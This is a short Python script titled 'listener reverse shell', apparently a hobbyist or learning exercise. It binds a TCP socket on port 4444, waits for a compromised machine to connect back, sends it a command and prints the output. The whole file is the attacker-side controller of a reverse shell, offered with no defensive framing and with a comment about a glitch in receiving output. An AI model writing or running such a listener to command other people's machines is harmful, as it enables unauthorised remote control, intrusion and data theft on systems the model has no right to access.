# listener reverse shell

import socket


socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(("0.0.0.0", 4444))
socket.listen(1)
print("[+] Listening for incoming TCP connection on port 4444")
connection, address = socket.accept()
print("[+] Connection received from: ", address)


command = "code"
command += "\n"
connection.send(command.encode())
result = connection.recv(99999)
print(result.decode("utf-8"))
# don't know why but the first time I send a command it doesn't show all the result
connection.send(b"")
result = connection.recv(99999)
print(result.decode("utf-8"))

